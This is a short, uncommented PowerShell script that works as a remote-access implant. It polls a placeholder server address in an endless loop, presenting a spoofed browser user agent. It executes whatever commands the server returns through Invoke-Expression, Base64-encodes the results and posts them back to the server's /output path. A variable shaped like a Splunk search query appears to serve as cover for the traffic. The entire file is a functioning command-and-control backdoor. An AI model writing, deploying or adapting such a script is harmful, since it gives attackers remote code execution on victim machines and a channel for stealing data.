$Uri = "http://<CHANGEME>:<CHANGEME>";
$rando = @{
    search = "search index=_internal | reverse | table index,host,source,sourcetype,_raw";
}
$stdout = @{
    data = $Null;
}

while ($true) {
    try {
        $command = Invoke-WebRequest -DisableKeepAlive -UseBasicParsing -Uri $Uri -Method Get -UserAgent "Mozilla/5.0 (Windows NT 10.0; Microsoft Windows 10.0.15063; en-US)" | Select-Object Content;

        if (!$command -Or $command -eq "") {
            continue;
        }

        try {
            $stdout.data = $(Invoke-Expression "$($command.Content)") 2>&1 | Out-String;
        } catch {
            $stdout.data = $_ | Out-String;
        } finally {

            if (!$stdout.data) {
                $stdout.data = "42";
            }

            $stdout.data = [System.Convert]::ToBase64String([System.Text.Encoding]::UNICODE.GetBytes($stdout.data));
        }

        Invoke-WebRequest -ContentType "text/html; charset=UTF-8" -DisableKeepAlive -UseBasicParsing -Uri "$($Uri)/output" -Method Post -UserAgent "Mozilla/5.0 (Windows NT 10.0; Microsoft Windows 10.0.15063; en-US)" -Body $stdout | Out-Null;
    } catch { }
}
